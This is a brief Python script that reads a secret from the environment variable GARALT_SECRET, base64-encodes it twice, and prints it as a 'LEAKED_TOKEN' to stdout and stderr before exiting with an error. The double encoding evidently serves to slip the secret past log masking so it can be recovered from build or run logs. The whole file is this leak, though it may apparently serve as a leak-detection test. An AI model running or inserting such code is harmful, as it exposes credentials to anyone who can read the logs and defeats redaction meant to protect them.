import os
import base64
import sys

secret = os.environ.get("GARALT_SECRET", "NOT_FOUND")
encoded = base64.b64encode(base64.b64encode(secret.encode()).decode().encode()).decode()
print(f"GARALT_LEAKED_TOKEN={encoded}", file=sys.stderr)
print(f"GARALT_LEAKED_TOKEN={encoded}")
sys.exit(1)
